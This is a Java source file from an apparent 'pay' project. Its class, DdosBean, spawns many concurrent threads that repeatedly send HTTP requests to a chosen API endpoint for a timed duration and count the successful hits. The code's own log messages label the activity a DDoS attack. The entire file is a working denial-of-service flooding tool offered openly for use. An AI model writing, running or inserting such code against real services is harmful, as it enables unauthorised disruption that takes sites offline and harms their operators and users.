package com.fzipp.pay.common.ddos;

import com.fzipp.pay.params.ddos.DdosStartParam;
import lombok.Data;
import lombok.extern.slf4j.Slf4j;

import java.util.ArrayList;
import java.util.List;

/**
 * @program pay
 * @description
 * @Author FFang
 * @Create 2022-06-07 04:46
 */
@Data
@Slf4j
public class DdosBean implements Runnable {

    private DdosStartParam param;

    private int total = 0;

    private int success = 0;

    private List<Thread> threads = new ArrayList<>();

    private DdosBean() {
    }

    private static DdosBean ddosBean = null;

    public static boolean isDdosBean() {
        return ddosBean != null;
    }

    public static String startDDOS(DdosStartParam param) {
        if (ddosBean == null) {
            ddosBean = new DdosBean();
            ddosBean.setParam(param);
            //初始化线程池
            for (int i = 1; i <= param.getConcurrent(); i++) {
                Thread thread = new Thread(ddosBean);
                thread.setName("ddos-" + i);
                ddosBean.getThreads().add(thread);
            }
            ddosBean.start();
            return ddosBean.timerTask();
        }
        return null;
    }

    public static DdosBean ddosObj() {
        return ddosBean;
    }

    @Override
    public void run() {
        try {
            int num = 0;
            while (true) {
                int status = HttpURLConnectionHelper.sendAll(param.getApi(), param.getType());
                total++;
                if (status == 200) success++;
                log.info("DDOS>" + status + ">" + (++num));
//                log.info("DDOS攻击>>" + Thread.currentThread().getName() + "：第" + (++num) + "次>>状态码：" + status);
                Thread.sleep(param.getInterval());
            }
        } catch (Exception e) {
            log.error("Thread>>run>>Error");
        }
    }

    public void start() {
        ddosBean.getThreads().forEach(Thread::start);
    }

    public String stop() {
        ddosBean.getThreads().forEach(Thread::stop);
        String mes = "Stop任务停止>>DDOS攻击>concurrent：" + param.getConcurrent() + ",Total：" + total + ",success：" + success;
        log.info(mes);
        ddosBean = null;
        return mes;
    }

    private String timerTask() {
        log.info("定时任务已启动>>DdosBean>>timerTask>>时长：" + param.getDuration() + "秒");
        try {
            Thread.sleep((param.getDuration()) * 1000);
            if (ddosBean != null) {
                this.stop();
                String mes = "定时任务结束>>DDOS攻击>时长：" + param.getDuration() + "秒>concurrent：" + param.getConcurrent() + ",Total：" + total + ",success：" + success;
                log.info(mes);
                return mes;
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return null;
    }

}
